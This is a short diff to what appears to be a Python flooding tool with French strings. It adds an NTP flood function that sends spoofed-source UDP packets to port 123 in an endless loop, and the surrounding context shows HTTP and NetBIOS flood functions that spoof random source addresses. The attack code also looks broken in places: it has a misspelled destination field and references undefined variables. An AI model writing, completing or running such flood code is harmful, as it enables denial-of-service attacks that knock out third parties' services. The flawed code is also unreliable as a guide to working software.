@@ -147,8 +147,11 @@ def httpFlood(cible,port):
 
 		time.sleep(15)
 
-def ntpFlood(cible):
-	print("NTP Flood sur {}".format(cible))
+def ntpFlood(cible, source):
+
+    pkt = IP(dsc=cible, src=source)/UDP(sport=random.randint(1000, 65535),dport=123)/Raw(load=data)
+    send(pkt,loop=1)
+    print("NTP Flood sur {}".format(cible))
 
 def netbiosFlood(cible):
 	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
